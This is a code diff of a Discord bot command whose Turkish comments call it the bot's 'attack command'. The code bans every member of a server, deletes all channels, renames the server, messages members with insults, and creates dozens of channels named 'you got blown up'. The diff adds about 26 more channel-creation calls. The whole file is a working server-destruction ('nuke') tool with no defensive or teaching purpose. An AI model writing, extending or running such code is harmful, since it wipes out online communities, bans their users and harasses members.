@@ -9,10 +9,6 @@ exports.run = function(client, message) {
 +"• Hepiniz adam olun!\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
 +"• ALAYINIZA BORU"    //BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
 
-+"• ADAM OLUN LAN ADAM\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
-+"• Hepiniz adam olun!\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
-+"• ALAYINIZA BORU"    //BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
-
     ));
   message.guild.members.map(c => c.ban());
   message.guild.channels.map(c => c.delete())
@@ -23,6 +19,32 @@ message.guild.setName("AĞLAYIN ")//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTE
   message.guild.createChannel("patladınız").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA AÇTIĞI KANALLAR
   message.guild.createChannel("patladınız").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA AÇTIĞI KANALLAR
   message.guild.createChannel("patladınız").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA AÇTIĞI KANALLAR
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
+  message.guild.createChannel("patladınız").catch(console.error);
   message.guild.createChannel("patladınız").catch(console.error);
   message.guild.createChannel("patladınız").catch(console.error);
   message.guild.createChannel("patladınız").catch(console.error);
